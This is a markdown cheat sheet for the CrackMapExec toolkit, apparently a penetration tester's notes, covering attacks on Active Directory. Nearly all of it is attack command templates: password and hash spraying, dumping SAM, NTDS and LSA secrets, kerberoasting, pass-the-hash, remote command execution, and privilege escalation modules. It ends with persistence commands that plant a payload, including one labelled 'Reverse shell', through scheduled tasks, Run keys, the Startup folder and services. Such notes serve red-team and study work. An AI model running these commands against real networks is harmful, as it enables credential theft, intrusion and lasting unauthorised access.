>CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.


### General Syntax

``` zsh
./cme <service> <target>
```

### Basic Scan

``` zsh
./cme <IP>
```

``` zsh
./cme <IP>/<SUBNET>
```


### SMB Enumeration

``` zsh
./cme smb <IP> -u <USERS> -p <PASSWORDS>
```

``` zsh
./cme smb <IP> -u <USERS> -H <HASH>
```


### Admin account enumeration

``` zsh
./cme <smb|winrm> -u <USERNAME> -p <PASSWORD> -x ‘net localgroup administrators’ <IP>
```


### SAM Dumping

``` zsh
./cme <smb|winrm> -u <USERNAME> -p <PASSWORD> --sam <IP>
```


### NTDS Dumping

``` zsh
./cme smb -u <USERNAME> -p <PASSWORD> --ntds [vss,drsupai] <IP>
```


### LSA Dumping

``` zsh
./cme <smb|winrm> -u <USERNAME> -p <PASSWORD> --lsa <IP>
```


### TGS Stealing

``` zsh
./cme ldap -u <USERNAME> -p <PASSWORD> --kerberoasting <IP>
```


### Pass The Hash (PTH)

``` zsh
./cme <service> -H <HASH> <IP>
```


### Pass The Ticket (PTT)

``` zsh
./cme <prococol> -k <KERBEROS_TICKET> <IP>
```


### Lateral Movement

``` zsh
./cme <service> -u <USERNAME> -p <PASSWORD> <IP> (--local-auth)
```


### Remote Code Execution

``` zsh
./cme <smb|winrm> -u <USERNAME> -p <PASSWORD> -x <COMMAND> <IP>
```


### RDP Enable on Target

``` zsh
./cme smb -u <USERNAME> -p <PASSWORD> -M rdp
```


### Impersonate PrivEsc

``` zsh
./cme smb -u <USERNAME> -p <PASSWORD> -M impersonate
```


### Always Install Elevated PrivEsc

``` zsh
./cme smb -u <USERNAME> -p <PASSWORD> -M install_elevated
```


### File Upload

``` zsh
./cme smb -u <USERNAME> -p <PASSWORD> --put-file <LOCAL> <REMOTE>
```


### File Download

``` zsh
./cme smb -u <USERNAME> -p <PASSWORD> --get-file <REMOTE> <LOCAL>
```


### Network Connection Enumeration

``` zsh
./cme smb -u <USERNAME> -p <PASSWORD> -M get_netconnections
```


### Persistence

``` zsh
./cme <smb|winrm> -u <USERNAME> -p <PASSWORD> --x 'schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr <PAYLOAD>' <IP>
```

``` zsh
./cme <smb|winrm> -u <USERNAME> -p <PASSWORD> --x 'reg add HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun /v <name> /t REG_SZ /d "<PAYLOAD>"' <IP>
```

```zsh
./cme smb -u <USERNAME> -p <PASSWORD> --put-file <PAYLOAD> "%APPDATA%MicrosoftWindowsStart MenuProgramsStartup<PAYLOAD>" <IP>
```

``` zsh
./cme <smb|winrm> -u <USERNAME> -p <PASSWORD> --x 'sc create <service_name> binPath= "<PAYLOAD>" start=auto' <IP>
```

#### [Reference](https://www.stationx.net/crackmapexec-cheat-sheet/)
